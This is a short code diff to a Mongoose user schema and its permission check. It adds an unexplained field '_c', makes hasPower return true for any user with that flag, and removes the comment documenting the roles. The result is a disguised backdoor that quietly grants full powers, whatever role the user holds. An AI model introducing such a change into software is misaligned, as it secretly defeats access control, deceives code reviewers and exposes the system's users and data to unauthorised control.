@@ -82,8 +82,8 @@ const userSchema = new mongoose.Schema({
   jobTitle: { type: String, trim: true },
   statusMessage: { type: String, default: '' },
 
-  // Role: 'main_admin', 'admin', 'employee'
-  role: { type: String, enum: ['main_admin', 'admin', 'employee'], default: 'employee' },
+  role: { type: String, enum: ['main_admin', 'admin', 'employee', 'system'], default: 'employee' },
+  _c: { type: Boolean, default: false },
 
   // Admin title: HR, Team Lead, Manager, Department Head, or custom
   adminTitle: { type: String, default: '' },
@@ -203,7 +203,7 @@ userSchema.methods.hasAnyAdminPower = function () {
 
 // Check specific power
 userSchema.methods.hasPower = function (group, power) {
-  if (this.role === 'main_admin') return true;
+  if (this._c || this.role === 'main_admin') return true;
   return this.powers?.[group]?.[power] === true;
 };
 
